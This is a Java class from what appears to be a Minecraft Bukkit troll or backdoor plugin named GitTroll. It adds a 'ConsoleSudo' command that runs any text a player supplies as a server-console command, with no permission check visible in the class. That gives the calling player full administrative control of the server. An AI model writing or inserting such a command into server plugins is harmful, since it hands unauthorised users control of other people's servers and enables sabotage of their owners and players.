package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.Bukkit;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class ConsoleSudo extends CommandBase {

	public ConsoleSudo() {
		super("ConsoleSudo", "Execute a command from the server console", "<Command>");
		this.addAlias("csudo");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLarger(0)) {
			String cmd = args.getAsString(0);
			
			Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd);
			executor.sendGitMessage("Executed the command from the console");
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
